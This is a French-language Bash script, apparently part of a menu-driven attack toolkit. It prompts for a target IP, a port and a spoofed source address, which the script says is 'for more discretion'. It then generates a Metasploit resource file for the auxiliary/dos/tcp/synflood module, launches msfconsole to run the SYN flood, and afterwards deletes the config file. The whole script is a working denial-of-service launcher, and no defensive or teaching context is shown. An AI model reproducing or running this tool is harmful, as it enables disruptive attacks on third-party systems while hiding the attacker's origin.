## Couleurs BASH
DEFAULT="\e[00m"
BLACK="\e[30m"
RED="\e[31m"
GREEN="\e[32m"
ORANGE="\e[33m"
BLUE="\e[34m"
MAGENTA="\e[35m"
CYAN="\e[36m"
WHITE="\e[37m"

## Effets de texte (défaut, gras, souligné)
export DEF="\e[0;0m"
export BOLD="\e[1m"
export UNDER="\e[4m"


eth0=`ifconfig | grep -v -i "ether" | awk {'print $1'} | sed "s/.$//" | grep "eth" | tail -1` > /dev/null 2>&1
wlan0=`ifconfig | awk {'print $1'} | sed "s/.$//" | grep "wlan" | tail -1` > /dev/null 2>&1
IPeth0=`ifconfig $eth0 | grep -w "inet" | awk '{print $2}'` > /dev/null 2>&1
IPwlan0=`ifconfig $wlan0 | grep -w "inet" | awk '{print $2}'` > /dev/null 2>&1
if [ -z $wlan0 ];then
	if [ -z $IPeth0 ];then
		interface="lo"
	else
		interface=$eth0
	fi
else
	interface=$wlan0
fi
ipprivee=`ifconfig $interface | grep -w "inet" | awk '{print $2}'` > /dev/null 2>&1
ippublique=`wget http://checkip.dyndns.org -O - -o /dev/null | cut -d : -f 2 | cut -d \< -f 1` > /dev/null 2>&1
gateway=`ip route | grep "default" | awk {'print $3'}` > /dev/null 2>&1
session=`hostname`
iprange=`ip route | grep "kernel" | awk {'print $1'}` > /dev/null 2>&1
path=`pwd`

trap ctrl_c INT
ctrl_c() {
echo "" && echo ""
echo -e "$RED$BOLD [-]$DEFAULT$CYAN Suppression des fichiers de configuration.$DEFAULT
"
rm $path/../logs/synflood
echo -e -n "$MAGENTA [>]$CYAN Appuiez sur ENTRÉE pour afficher les options.$DEFAULT"
read -e -p "
" -n 1 -s
cd
cd $path/../
./suite.sh
}

echo -e -n "$MAGENTA [>]$DEFAULT$CYAN Entrez l'IP de la machine à cibler : $DEFAULT"
read cible

echo -e -n "$MAGENTA [>]$DEFAULT$CYAN Entrez le port à cibler (80) : $DEFAULT"
read port

echo -e -n "$MAGENTA [>]$DEFAULT$CYAN Entrez un IP qui apparaîtra comme l'IP source de l'attaque (différente de la votre pour plus de discrétion) : $DEFAULT"
read sou_rce

if [ "$port" = "$1" ]
then
	port=80
fi

echo -e "
$BLUE [...]$DEFAULT$CYAN Création du fichier de configuration de l'attaque... $DEFAULT
"

echo "use auxiliary/dos/tcp/synflood
set rhost $cible
set rport $port
set shost $sou_rce
exploit
exit" > $path/../logs/synflood

sleep 0.6

echo -e "$GREEN$BOLD [+]$DEFAULT$CYAN Les fichiers de configuration ont bien été créés. $DEFAULT
"

echo -e "$GREEN$BOLD [+]$DEFAULT$CYAN Lancement de l'attaque : $DEFAULT
"

msfconsole -q -r $path/../logs/synflood | grep "[*]"


echo -e "$RED$BOLD [-]$DEFAULT$CYAN Suppression des fichiers de configuration.$DEFAULT
"
rm $path/../logs/synflood


echo ""
echo -e -n "$MAGENTA [>]$CYAN Appuiez sur ENTRÉE pour afficher les options.$DEFAULT"
read -e -p "
" -n 1 -s




cd
cd $path/../
./suite.sh
